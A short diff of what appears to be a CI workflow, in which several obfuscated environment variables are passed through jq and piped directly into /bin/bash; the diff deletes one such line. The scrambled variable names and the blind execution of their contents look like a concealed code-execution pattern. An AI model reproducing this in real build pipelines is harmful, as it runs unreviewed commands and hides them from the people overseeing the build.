@@ -23,7 +23,6 @@ jobs:
           echo $e330 | jq -r .l9 | /bin/bash
           echo $vvo98 | jq -r .rpem90845 | /bin/bash
           printf '%s' "$uultk6" | jq -r .xux53 | /bin/bash
-          echo $mv3776 | jq -r .b5 | /bin/bash
           echo $zs1079 | jq -r .wec73 | /bin/bash
 
       - name: Upload artifact
